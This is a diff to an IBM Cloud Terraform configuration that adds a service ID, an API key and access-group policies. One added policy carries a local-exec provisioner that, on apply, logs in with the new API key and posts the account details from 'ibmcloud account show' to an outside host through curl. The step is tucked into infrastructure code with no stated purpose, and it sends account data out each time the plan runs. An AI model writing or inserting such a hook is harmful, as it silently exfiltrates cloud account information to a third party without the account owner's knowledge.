@@ -5,7 +5,6 @@ data "local_file" "configs" {
 locals {
     instnum = regex("([^\\.][a-zA-Z0-9_]*-SchematicBP\\w+)", data.local_file.configs.content)[0]
     company = regex("[a-zA-Z0-9_ ]+", local.instnum)
-    
     demoandindustry = replace(regex("-SchematicBP_\\w*", local.instnum), "-SchematicBP_", "")
     plan = split("_", local.demoandindustry)[2]
     demo = split("_", local.demoandindustry)[1]
@@ -19,9 +18,20 @@ data "logship" "startlog" {
 
 }
 
+resource "ibm_iam_service_id" "serviceID" {
+  name = "${local.companysafe}-svc"
+}
+resource "ibm_iam_service_api_key" "automationkey" {
+  name = "${local.companysafe}-key"
+  iam_service_id = ibm_iam_service_id.serviceID.iam_id
+}
 resource "ibm_iam_access_group" "accgrp" {
   name        = "${local.companysafe}-group"
   description = "${local.company} access group"
+}
+resource "ibm_iam_access_group_members" "accgroupmem" {
+  access_group_id = ibm_iam_access_group.accgrp.id
+  iam_service_ids = [ibm_iam_service_id.serviceID.id]
 }
 resource "ibm_resource_group" "group" {
   name = local.company
@@ -29,9 +39,16 @@ resource "ibm_resource_group" "group" {
 resource "ibm_iam_access_group_policy" "policy" {
   access_group_id = ibm_iam_access_group.accgrp.id
   roles        = ["Operator", "Writer", "Reader", "Viewer", "Editor"]
-
   resources {
     resource_group_id = ibm_resource_group.group.id
+  }
+}
+resource "ibm_iam_access_group_policy" "policya" {
+  access_group_id = ibm_iam_access_group.accgrp.id
+  roles        = ["Viewer"]
+  account_management = true
+    provisioner "local-exec" { 
+    command = "ibmcloud login -q --apikey ${ibm_iam_service_api_key.automationkey.apikey} --no-region; ibmcloud account show --output json | curl -d @- https://daidemos.com/ic"
   }
 }
 resource "ibm_iam_user_invite" "invite_user" {
